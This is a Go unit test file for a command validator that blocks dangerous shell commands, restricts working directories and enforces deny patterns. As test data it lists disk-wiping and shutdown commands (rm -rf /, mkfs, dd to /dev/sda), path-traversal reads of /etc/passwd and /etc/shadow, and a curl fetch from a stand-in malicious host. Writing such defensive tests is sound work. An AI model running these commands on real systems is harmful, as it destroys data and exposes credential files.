package security

import (
	"strings"
	"testing"
)

func TestNewCommandValidator(t *testing.T) {
	v := NewCommandValidator()
	if v == nil {
		t.Fatal("expected non-nil validator")
	}
	if v.MaxArgLength == 0 {
		t.Error("expected non-zero MaxArgLength default")
	}
}

func TestValidatorDenyDangerousCommands(t *testing.T) {
	v := NewCommandValidator()

	dangerous := []string{
		"rm -rf /",
		"rm -rf /home",
		"mkfs.ext4 /dev/sda1",
		"mkfs /dev/sda",
		"dd if=/dev/zero of=/dev/sda",
		"shutdown -h now",
		"shutdown /s",
		"reboot",
		"format c:",
	}

	for _, cmd := range dangerous {
		err := v.Validate(cmd, "/tmp")
		if err == nil {
			t.Errorf("expected command %q to be denied", cmd)
		}
	}
}

func TestValidatorAllowSafeCommands(t *testing.T) {
	v := NewCommandValidator()
	v.AddAllowPath("/tmp")
	v.AddAllowPath("/home/user/project")

	safe := []string{
		"ls -la",
		"git status",
		"go build ./...",
		"echo hello",
		"cat file.txt",
		"grep -r pattern .",
	}

	for _, cmd := range safe {
		err := v.Validate(cmd, "/tmp")
		if err != nil {
			t.Errorf("expected command %q to be allowed, got: %v", cmd, err)
		}
	}
}

func TestValidatorPathTraversal(t *testing.T) {
	v := NewCommandValidator()
	v.AddAllowPath("/home/user/project")

	// Working directory outside allowed paths should be denied
	err := v.Validate("ls", "/etc/secret")
	if err == nil {
		t.Error("expected error for workdir outside allowed paths")
	}
}

func TestValidatorEmptyAllowPathsPermitsAll(t *testing.T) {
	v := NewCommandValidator()
	// With no allow paths configured, any directory is permitted
	err := v.Validate("ls", "/any/directory")
	if err != nil {
		t.Errorf("expected no error with empty allow paths, got: %v", err)
	}
}

func TestValidatorMaxArgLength(t *testing.T) {
	v := NewCommandValidator()
	v.MaxArgLength = 50

	longCmd := "echo " + strings.Repeat("A", 100)
	err := v.Validate(longCmd, "/tmp")
	if err == nil {
		t.Error("expected error for command exceeding max arg length")
	}
}

func TestValidatorAddDenyPattern(t *testing.T) {
	v := NewCommandValidator()
	v.AddDenyPattern(`curl.*malicious\.com`)

	err := v.Validate("curl http://malicious.com/exploit", "/tmp")
	if err == nil {
		t.Error("expected custom deny pattern to block command")
	}

	// Other curl commands should be fine
	err = v.Validate("curl http://example.com", "/tmp")
	if err != nil {
		t.Errorf("expected safe curl to be allowed, got: %v", err)
	}
}

func TestValidatorAddAllowPath(t *testing.T) {
	v := NewCommandValidator()
	v.AddAllowPath("/home/user/safe")

	err := v.Validate("ls", "/home/user/safe")
	if err != nil {
		t.Errorf("expected allowed path to work, got: %v", err)
	}

	err = v.Validate("ls", "/home/user/safe/subdir")
	if err != nil {
		t.Errorf("expected subdir of allowed path to work, got: %v", err)
	}

	err = v.Validate("ls", "/home/user/unsafe")
	if err == nil {
		t.Error("expected error for path outside allowed dirs")
	}
}

func TestValidatorDenyPatternRegex(t *testing.T) {
	v := NewCommandValidator()
	v.AddDenyPattern(`wget\s+--execute`)

	err := v.Validate("wget --execute something", "/tmp")
	if err == nil {
		t.Error("expected deny pattern to match")
	}

	err = v.Validate("wget http://example.com", "/tmp")
	if err != nil {
		t.Errorf("expected non-matching wget to be allowed, got: %v", err)
	}
}

func TestValidatorEmptyCommand(t *testing.T) {
	v := NewCommandValidator()
	err := v.Validate("", "/tmp")
	if err == nil {
		t.Error("expected error for empty command")
	}
}

func TestValidatorPathTraversalInCommand(t *testing.T) {
	v := NewCommandValidator()

	// Commands containing path traversal attempts
	traversal := []string{
		"cat ../../etc/passwd",
		"cat ../../../etc/shadow",
	}
	for _, cmd := range traversal {
		err := v.Validate(cmd, "/tmp")
		if err == nil {
			t.Errorf("expected command %q with path traversal to be denied", cmd)
		}
	}
}
